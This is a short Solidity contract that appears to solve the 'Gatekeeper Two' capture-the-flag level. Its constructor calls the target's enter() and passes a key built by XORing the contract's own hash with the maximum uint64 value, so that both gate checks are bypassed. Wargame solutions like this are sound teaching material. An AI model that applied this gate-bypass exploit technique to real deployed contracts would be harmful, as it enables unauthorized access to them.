// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo g;

    constructor (address target) {
        g = GatekeeperTwo(target);
        bytes8 b = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        g.enter(b);
    }
}